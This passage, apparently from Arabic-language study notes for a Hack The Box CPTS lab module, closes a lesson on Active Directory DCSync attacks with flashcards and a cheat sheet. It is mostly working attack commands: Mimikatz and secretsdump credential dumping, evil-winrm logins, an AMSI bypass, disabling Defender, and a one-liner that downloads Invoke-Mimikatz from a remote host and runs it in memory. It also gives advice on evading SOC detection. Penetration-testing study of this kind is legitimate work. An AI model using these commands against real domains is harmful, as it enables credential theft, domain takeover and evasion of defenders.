ما تكدر تفتح واجهة رسومية للويندوز MS01؟ مو مشكلة. المخترقين يحبون الـ CLI (واجهة الأوامر).

شيك منفذ الـ WinRM (5985). إذا مفتوح، ادخل مباشرة باستخدام أداة `evil-winrm` الرهيبة من حاسبة اللينكس مالتك:

Bash

```
evil-winrm -i 172.16.5.225 -u htb-student -p 'Academy_student_AD!'
```

ومن هناك طبق أوامر الـ PowerShell مالتك بشكل طبيعي كأنك كاعد على الحاسبة!

Variation 5: ماذا لو ما لقيت اليوزر `khartsfield` بالـ Dump؟

مرات الدامب يكون ضخم وتقطع الأداة أو إنت تغلط بالاسم.

الحل: استعرض كل اليوزرات الموجودة بالدومين للتأكد من السبيلينج:

Bash

```
GetADUsers.py -all INLANEFREIGHT/htb-student:'Academy_student_AD!'@172.16.5.5 | grep -i khart
```

إذا طلع موجود، ارجع سوي DCSync محدد `-just-dc-user` اله فقط.

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ):

🚨 فخ الـ Netonly:

كثير من الطلاب يكتب `runas /netonly` وبعدين يكتب بالـ CMD أمر `whoami`. فيطلعله `htb-student` (يوزره العادي). فيعتقد إن الأمر فشل!

الـ `netonly` لا يغير هويتك داخل الجهاز اللي إنت كاعد عليه. هو فقط يرفق "باج هوية" مخفي (Injected Token) يتم تقديمه للسيرفرات الثانية بالشبكة. لا تصدق الـ `whoami` بعد هذا الأمر.

🚨 فخ الـ AMSI Bypass:

إذا حاولت تسوي AMSI Bypass وفشل، لا تحاول تشغل سكربتك الخبيث لأن راح ينلزم، والويندوز راح يسجلك باللوج (Logs) كنشاط خبيث وينبه فريق الحماية (SOC). تأكد من نجاح التخطي أولاً بأوامر بسيطة مثل طباعة كلمة "amsiutils".

💡 Golden Tips:

"الهجوم من لينكس (secretsdump) يعتبر OPSEC Safe أكثر (آمن عملياتياً) من تشغيل Mimikatz محلياً. إذا تكدر تضرب الـ DC من بعيد عبر الشبكة، لا تتعب نفسك وتنزل ملفات وحماية وتتجاوز AV على سيرفر ويندوز. خليك Fileless دائماً."

════════════════════════════════════════════

💎 الفلاشكاردز — ملخص سريع للحفظ

════════════════════════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو الفائدة من خيار `/netonly` بأمر `runas`؟

✅ Back: يسمح بتشغيل برنامج كـ يوزر عادي محلياً، لكن عند الاتصال بأي مورد في الشبكة، يستخدم صلاحيات (Credentials) اليوزر المحدد بالأمر، يفيد بالـ Pivoting وهجمات AD.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: أمر سحب DCSync ليوزر محدد باستخدام Mimikatz؟

✅ Back: `lsadump::dcsync /domain:domain.local /user:username`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف نفلتر بـ PowerShell عن اليوزرات اللي عدهم التشفير العكسي (Reversible Encryption)؟

✅ Back: نفحص الـ userAccountControl باستخدام Bitwise AND:

`-Filter 'userAccountControl -band 128'`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: إذا RDP كان مسدود بسيرفر ويندوز، شنو البديل الأفضل للوصول للـ Command Line؟

✅ Back: نستخدم بروتوكول WinRM (بورت 5985) باستخدام أداة `evil-winrm`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ليش مرات ملف `cleartext` للـ DCSync يطلع حجمه صفر بايت (0 bytes)؟

✅ Back: إما اليوزر ما غير باسورده بعد تفعيل الإعداد (لذلك بقى NTLM)، أو أداة الاستخراج فشلت بفك التشفير لأنها ما سحبت الـ PEK (Password Encryption Key).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: شنو هو الـ AMSI وليش لازم نتجاوزه؟

✅ Back: الـ Anti-Malware Scan Interface، نظام حماية بالويندوز يفحص محتوى سكربتات الـ PowerShell بالذاكرة قبل التنفيذ، يمنع أدوات مثل PowerView و Invoke-Mimikatz.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: أوامر `secretsdump` الإضافية لاستخراج الباسوردات السابقة وتاريخها؟

✅ Back: نضيف خيارات `-history` و `-pwd-last-set`.

════════════════════════════════════════════

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

════════════════════════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (Advanced DCSync & AD Enumeration Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم المتقدم (Windows Environment):

١. حدد مستوى الحماية: هل تكدر تشغل Mimikatz؟ أو تحتاج PowerShell؟ أو ترجع للـ Linux؟

٢. انتحل الشخصية: استخدم `runas /netonly` لتهيئة هوية الشبكة.

٣. استطلع بصمت: استخدم `Get-ADUser` أو PowerView لمعرفة الأهداف الثمينة (مثل Reversible Encryption).

٤. نفذ الهجوم: `lsadump::dcsync` أو `Invoke-DCSync`.

٥. الخطط البديلة: إذا فشل كل شي، ارجع للـ Kerberoasting والـ AS-REP.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية (DCSync Tools & Bypass):

|**الهدف**|**الأداة**|**الأمر**|
|---|---|---|
|حقن هوية الشبكة (Netonly)|CMD / runas|`runas /netonly /user:DOMAIN\User powershell`|
|تفعيل Debug|Mimikatz|`privilege::debug`|
|سحب DCSync|Mimikatz|`lsadump::dcsync /domain:domain.local /user:DOMAIN\Target`|
|بحث عن التشفير العكسي (رسمي)|Get-ADUser (PS)|`Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`|
|بحث عن التشفير العكسي (مخصص)|PowerView (PS)|`Get-DomainUser -Identity * \| ? {$_.useraccountcontrol -like '*ENCRYPTED*'}`|
|סحب DCSync بالـ PS|PowerSploit|`Invoke-DCSync -Users @("target") -Domain "domain.local"`|
|סحب تفاصيل عميقة|secretsdump.py|`secretsdump.py -just-dc -history -pwd-last-set -user-status DOMAIN/USER@DC_IP`|
|تعطيل Defender|PowerShell|`Set-MpPreference -DisableRealtimeMonitoring $true`|
|تخطي AMSI (بسيط ومُشفر)|PowerShell|`[Ref].Assembly.GetType...SetValue($null,$true)`|
|استدعاء Mimikatz بالذاكرة|PowerShell|`IEX (New-Object Net.WebClient).DownloadString('http://IP/Invoke-Mimikatz.ps1')`|
|اتصال بديل للـ RDP|evil-winrm|`evil-winrm -i TARGET_IP -u user -p 'password'`|
|סحب قائمة اليوزرات للتأكد|GetADUsers.py|`GetADUsers.py -all DOMAIN/User:Pass@DC_IP`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 خصائص userAccountControl (UAC) المهمة:

كل خاصية إلها رقم بالـ AD. نستخدم `band` لفحصها:

- `512`: حساب عادي (NORMAL_ACCOUNT)
    
- `128`: تشفير قابل للعكس (ENCRYPTED_TEXT_PWD_ALLOWED)
    
- `640`: 512 + 128 (حساب عادي + تشفير عكسي)
    
- `2`: حساب معطل (ACCOUNTDISABLE)
    
- `4194304`: ما يطلب مصادقة מסبقة (DONT_REQ_PREAUTH) ← هدف الـ AS-REP Roasting!
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ والتنبيهات:

❌ تصديق ناتج `whoami` بعد `runas /netonly`. הأمر يغير هوية הشبكة فقط!

❌ ترك الـ AMSI شغال ומحاولة تنفيذ سكربتات خبيثة، مما يؤدي للتبليغ הأمني.

❌ הاعتقاد بأن 0-byte بملف cleartext يعني فشل הأداة دائماً (قد يكون الـ password לא تغير منذ تفعيل الميزة).

❌ نسيان أن Mimikatz يحتاج تشغيله كـ Administrator (`Run as Admin`) לפני طلب `privilege::debug`.

══════════════════════════════════════════════════════

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة، وليش نحتاج أدوات ويندوز)

✅ كل المصطلحات (Mimikatz, netonly, UAC band 128, AMSI, WinRM)

✅ كيفية التفكير (decision trees لاختيار سلاحك بالويندوز)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر من Mimikatz والـ PowerShell)

✅ الـ bypasses والـ variations والفخوخ (AMSI, Defender, RDP timeouts)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪


---

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED          ║
║  [✓] AUTHORED BY: Hexsein · CPTS Candidate · Al-Nahrain Univ.       ║
║  [→] NEXT TARGET: SEC-22 — NEXT SECTION NAME HERE                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```